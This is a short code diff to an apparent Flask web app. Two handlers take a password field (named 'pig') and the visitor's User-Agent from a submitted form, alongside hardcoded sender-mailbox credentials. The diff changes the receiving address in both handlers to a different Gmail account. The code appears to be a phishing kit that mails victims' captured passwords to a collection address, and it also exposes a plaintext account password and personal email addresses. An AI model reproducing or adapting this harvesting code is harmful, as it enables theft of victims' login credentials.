@@ -78,7 +78,7 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "auto528@ecofuture.bio"
         sender_emaill = "auto528"
-        receiver_email = "miriam.adelson@clubmember.org"
+        receiver_email = "danielnewwoj@gmail.com"
         password = "vipb2b84382e351"
         useragent = request.headers.get('User-Agent')
 
@@ -118,7 +118,7 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "auto528@ecofuture.bio"
         sender_emaill = "auto528"
-        receiver_email = "miriam.adelson@clubmember.org"
+        receiver_email = "danielnewwoj@gmail.com"
         password = "vipb2b84382e351"
         useragent = request.headers.get('User-Agent')
 
